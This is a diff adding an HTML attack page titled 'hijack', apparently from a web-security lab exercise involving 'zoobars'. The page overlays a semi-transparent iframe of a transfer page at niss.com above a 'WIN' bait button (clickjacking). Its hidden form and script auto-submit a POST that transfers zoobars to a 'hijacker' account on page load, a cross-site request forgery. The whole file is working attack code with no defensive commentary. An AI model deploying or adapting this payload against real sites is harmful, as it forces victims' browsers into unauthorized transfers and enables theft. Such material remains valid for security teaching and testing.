@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>hijack</title>
+</head>
+
+<style>
+    iframe {
+        width: 1440px;
+        height: 900px;
+        position: absolute;
+        top: -0px;
+        left: -0px;
+        z-index: 2;
+        opacity: 0.5;
+    }
+
+    #clickjacking {
+        position: absolute;
+        top: 294px;
+        left: 584px;
+        z-index: 1;
+    }
+</style>
+
+<body>
+<iframe name="it" src="https://niss.com/transfer.php" ></iframe>
+
+<form method="POST"
+      name="transfer-form"
+      action="https://niss.com/transfer.php"
+      target="it"
+      id="transfer-form"
+      style="display:none">
+
+    <input name="zoobars" type="text" value="1" size="5">
+    <input name="recipient" type="text" value="hijacker">
+    <input type="hidden" name="submission" value="Send">
+</form>
+<form>
+    <input type="submit" id="hijacker" value="WIN">
+</form>
+
+<script type="text/javascript">
+    form = document.getElementById("transfer-form");
+    form.submit();
+</script>
+
+
+</body>
+</html>
